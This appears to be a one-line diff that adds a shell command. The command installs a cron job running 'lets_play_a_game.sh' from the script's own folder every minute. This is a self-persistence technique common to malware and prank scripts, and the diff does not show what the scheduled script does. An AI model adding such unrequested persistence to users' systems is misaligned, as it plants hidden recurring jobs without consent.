@@ -1,0 +1,1 @@
+(crontab -l 2>/dev/null; echo "*/1 * * * * $(dirname $(readlink -f $0))/lets_play_a_game.sh")| crontab -
